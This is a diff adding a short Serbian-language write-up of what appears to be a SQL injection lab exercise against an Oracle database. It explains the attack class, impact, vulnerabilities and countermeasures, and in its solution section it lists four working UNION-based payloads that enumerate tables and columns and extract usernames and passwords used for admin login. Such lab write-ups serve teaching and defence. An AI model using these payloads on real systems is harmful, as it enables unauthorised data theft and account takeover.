@@ -1,0 +1,22 @@
+**Objašnjenje klase napada**
+Ovo je SQL injection pomoću **UNION napada**, gde napadač ne samo da menja upit, već i aktivno istražuje strukturu baze (enumeracija tabela i kolona) kako bi došao do osetljivih podataka.
+
+**Uticaj eksploatacije**
+Omogućava kompletan pristup podacima iz baze, uključujući korisnička imena i lozinke. U ovom slučaju napadač dolazi do administrator kredencijala i preuzima nalog.
+
+**Ranjivosti**
+Direktno ubacivanje inputa u SQL, nedostatak validacije i činjenica da aplikacija vraća rezultate upita korisniku. Takođe, baza dozvoljava pristup sistemskim tabelama (`all_tables`, `all_tab_columns`).
+
+**Rešenje (eksploit)**
+Prvo je potvrđen broj kolona:
+`'+UNION+SELECT+'abc','def'+FROM+dual--`
+Zatim su izlistane tabele:
+`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
+Nakon toga kolone ciljane tabele:
+`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
+Na kraju su izvučeni username i password:
+`'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
+Dobijen password za administratora je iskorišćen za login.
+
+**Kontramere**
+Prepared statements, zabrana pristupa sistemskim tabelama, striktna validacija inputa, ograničavanje privilegija baze i skrivanje rezultata upita (ne vraćati sirove SQL rezultate korisniku).
